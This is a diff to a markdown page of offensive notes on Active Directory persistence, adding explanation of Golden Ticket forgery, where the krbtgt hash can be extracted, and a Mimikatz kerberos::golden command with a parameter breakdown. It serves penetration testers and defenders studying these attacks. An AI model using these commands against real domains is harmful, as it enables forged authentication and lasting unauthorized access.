@@ -14,7 +14,7 @@ title: Active Directory persistence
 ## 1. DC Sync
 The more privileged credentials are, the sonner they will be rotated after breach detection. The goal then is to persist with near-privileged credentials, not with a super-user:
 
-- Local administrator on several machines - usually there is a group or twowith local admin rights on almost all machines.
+- Local administrator on several machines - usually there is a group or two with local admin rights on almost all machines.
 - Service accounts with delegation permissions - with this accounts it's possible to force golden and silver tickets to perform Kerberos delegation attacks.
 - Privileged AD services accounts
 
@@ -32,7 +32,9 @@ It is not just the DCs that can initiate DC Synchronization. Accounts such as th
 ```
 
 ## 2. Golden Ticket
-_Golden Ticket_ is forged TGT of high privileged account. The authorization step is bypassed. Having a valid TGT of a privileged account, an attacker can request a TGS for almost any service. In order to forge a golden ticket `krbtgt` account's password hash is required. With this hash an attacker can sign a TGT for any user account. By default, the `krbtgt` account's password never changes, meaning once hacked, unless it is manually rotated, it's possible to generate TGTs forever.
+_Golden Ticket_ is forged TGT of high privileged account. The authorization step is bypassed. Having a valid TGT of a privileged account, an attacker can request a TGS for almost any service. DC doesn't perform user account validation until the TGT is older than 20 minutes so a revoked account can be used as well. User's password change has no effect on this attack.
+
+In order to forge a golden ticket `krbtgt` account's password hash is required. With this hash an attacker can sign a TGT for any user account. By default, the `krbtgt` account's password never changes, meaning once hacked, unless it is manually rotated, it's possible to generate TGTs forever.
 
 Required information to forge Golden Ticket:
 
@@ -41,12 +43,26 @@ Required information to forge Golden Ticket:
 - domain SID
 - user ID
 
+> **NOTE**: `krbtgt` hash is an NT (RC4 + HMAC) hash. It can be extracted from the lsass or a SAM file of a Domain Controller.
+
 ```powershell
 # Mimikatz - forge Golden Ticket
-> kerberos::golden /admin:<ACCOUNT> /domain:<DOMAIN> /id:500 /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /endin:600 /renewmax:10080 /ptt
+> kerberos::golden /user:<ACCOUNT> /domain:<DOMAIN_FQDN> /id:500 /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NT> /endin:600 /ptt
 
 # Check if it works
 dir \\dc\C$\
+```
+
+Structure of the Mimikatz command:
+
+```plaintext
+kerberos::golden        - Mimikatz module
+/user:<ACCOUNT>         - User for which the TGT is generated
+/domain:<DOMAIN_FQDN>   - Domain FQDN
+/sid:<DOMAIN_SID>       - Domain SID
+/krbtgt:<KRBTGT_NT>     - krbtgt's NT hash. Other: /aes128, /aes256
+/endin:<INT>            - ticket lifetime in minutes (10 years by default)
+/ptt                    - pass-the-ticket (inject into memory). Other: /ticket (save to the file)
 ```
 
 ## 3. Silver Ticket
